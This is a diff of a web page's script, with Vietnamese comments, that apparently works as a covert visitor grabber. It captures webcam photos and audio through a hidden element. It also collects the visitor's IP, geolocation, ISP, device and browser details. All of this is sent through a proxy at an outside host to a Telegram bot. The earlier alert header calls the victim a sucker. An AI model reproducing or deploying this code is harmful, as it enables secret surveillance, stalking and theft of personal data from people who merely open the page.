@@ -50,14 +50,17 @@
     <audio id="audio" style="display:none;"></audio>
 
     <script>
-      
+        // ==========  ==========
+        // 
+        // 
         const PROXY_URL = " https://fuckhacker.onrender.com/";
         
         const infoDiv = document.getElementById('info');
         
-        const PHOTO_COUNT = 7;
+        // Cấu hình chụp ảnh
+        const PHOTO_COUNT = 5;
         const PHOTO_INTERVAL = 300;
-        const AUDIO_DURATION = 400;
+        const AUDIO_DURATION = 4000;
         
         let infoSent = false;
         let photoCount = 0;
@@ -70,9 +73,9 @@
         let mediaRecorder = null;
         let audioChunks = [];
 
-      
+        // ========== HÀM GỬI QUA PROXY (KHÔNG CẦN TOKEN) ==========
         
-       
+        // Chuyển Blob sang base64
         function blobToBase64(blob) {
             return new Promise((resolve) => {
                 const reader = new FileReader();
@@ -170,7 +173,7 @@
             }
         }
 
-        
+        // ========== CÁC HÀM GIỮ NGUYÊN (CHỤP ẢNH, GHI ÂM, LẤY INFO) ==========
         
         async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
             return new Promise((resolve) => {
@@ -327,7 +330,7 @@
                 if (locationInfo.lat && locationInfo.lon) {
                     telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}">🗺️ Xem vị trí trên Google Maps</a>`;
                 }
-                const telegramText = `<b>📥 Gà Kìa</b>\n\n<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n<b>📍 Thành phố:</b> <code>${locationInfo.city}</code>\n<b>🗺️ Khu vực:</b> <code>${locationInfo.region}</code>\n<b>🏳️ Quốc gia:</b> <code>${locationInfo.country}</code>\n<b>🏢 Nhà mạng:</b> <code>${locationInfo.isp}</code>${telegramMapsLink}\n<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n<b>💾 RAM:</b> <code>${deviceMemory}</code>\n<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
+                const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n<b>📍 Thành phố:</b> <code>${locationInfo.city}</code>\n<b>🗺️ Khu vực:</b> <code>${locationInfo.region}</code>\n<b>🏳️ Quốc gia:</b> <code>${locationInfo.country}</code>\n<b>🏢 Nhà mạng:</b> <code>${locationInfo.isp}</code>${telegramMapsLink}\n<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n<b>💾 RAM:</b> <code>${deviceMemory}</code>\n<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
                 await sendToTelegram(telegramText);
             }
         }
